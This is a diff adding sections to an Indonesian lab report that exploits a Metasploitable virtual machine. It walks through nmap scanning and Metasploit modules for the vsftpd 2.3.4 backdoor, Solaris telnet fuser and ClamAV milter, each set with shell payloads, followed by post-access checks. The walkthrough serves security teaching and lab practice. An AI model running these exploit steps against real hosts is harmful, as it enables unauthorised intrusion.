@@ -168,5 +168,109 @@ Jalankan Machine Virtualnya
 Untuk login gunakan username serta password msfadmin
 
 #D. Attack Exploit
-#E. Analasis Attack
-#F. Kesimpulan dan Saran
+##D.1 Exploit menggunakan vsftpd_234_backdoor
+Langkah pertama yang dilakukan adalah mengecek metasploitable apakah dapat dilakukan exploit dengan menggunakan vsftpd_234_backdoor dengan command
+```
+nmap -sV "Target IP"
+```
+
+Apabila Target memiliki service yang terbuka dengan menggunakan versi vsftpd 2.3.4 maka exploit dapat dilakukan
+
+Langkah selanjutnya yang dilakukan adalah buka aplikasi msfconsole
+
+Tampilan akan seperti dibawah ini
+
+Masukkan command dibawah untuk mulai menggunakan exploit
+```
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+Set target ip serta payload yang akan digunakan
+```
+set RHOST localhost
+set PAYLOAD cmd/unix/interact
+```
+Setelah mengatur ip target dan payload yang akan digunakan selanjutnya dilakukan exploit
+```
+exploit
+```
+
+Apabila tampilan diatas telah muncul, maka host berhasil ditembus
+
+Melakukan pengecekan ip host dan ternyata sama
+
+Melakukan pengecekan service yang terdapat pada host
+
+Cek uname -a dari host
+
+##D.2 Exploit menggunakan fuser
+Langkah pertama yang dilakukan adalah mengecek metasploitable apakah dapat dilakukan exploit dengan menggunakan fuser dengan command
+```
+nmap -sV "Target IP"
+```
+
+Apabila Target memiliki service yang telnet terbuka maka exploit dapat dilakukan
+
+Langkah selanjutnya yang dilakukan adalah buka aplikasi msfconsole
+
+Tampilan akan seperti dibawah ini
+
+Masukkan command dibawah untuk mulai menggunakan exploit
+```
+use exploit/solaris/telnet/fuser
+```
+Set target ip, port, user serta payload yang akan digunakan
+```
+set RHOST localhost
+set RPORT 23
+set USER bin
+set PAYLOAD cmd/unix/bind_perl
+```
+Setelah mengatur ip target dan payload yang akan digunakan selanjutnya dilakukan exploit
+```
+exploit
+```
+
+Apabila tampilan diatas telah muncul, maka host berhasil ditembus
+
+Melakukan pengecekan ip host dan ternyata sama
+
+Melakukan pengecekan service yang terdapat pada host
+
+Cek uname -a dari host
+
+##D.3 Exploit menggunakan clamav_milter_blackhole
+Langkah pertama yang dilakukan adalah mengecek metasploitable apakah dapat dilakukan exploit dengan menggunakan clamav_milter_blackhole dengan command
+```
+nmap -sV "Target IP"
+```
+
+Apabila Target memiliki service smtp terbuka maka exploit dapat dilakukan
+
+Langkah selanjutnya yang dilakukan adalah buka aplikasi msfconsole
+
+Tampilan akan seperti dibawah ini
+
+Masukkan command dibawah untuk mulai menggunakan exploit
+```
+use exploit/unix/smtp/clamav_milter_blackhole
+```
+Set target ip, port, user serta payload yang akan digunakan
+```
+set RHOST 192.168.1.6
+set RPORT 25
+set PAYLOAD cmd/unix/bind_perl
+```
+Setelah mengatur ip target dan payload yang akan digunakan selanjutnya dilakukan exploit
+```
+exploit
+```
+
+Apabila tampilan diatas telah muncul, maka host berhasil ditembus
+
+Melakukan pengecekan ip host dan ternyata sama
+
+Melakukan pengecekan service yang terdapat pada host
+
+Cek uname -a dari host
+
+#E. Kesimpulan dan Saran
